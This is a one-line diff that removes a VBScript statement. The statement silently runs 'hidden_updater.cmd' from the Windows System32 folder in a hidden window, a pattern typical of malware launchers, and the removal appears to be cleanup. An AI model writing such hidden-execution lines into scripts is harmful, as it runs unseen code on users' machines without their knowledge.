@@ -1,1 +1,0 @@
-CreateObject("Wscript.Shell").Run "C:\Windows\System32\hidden_updater.cmd",0,True
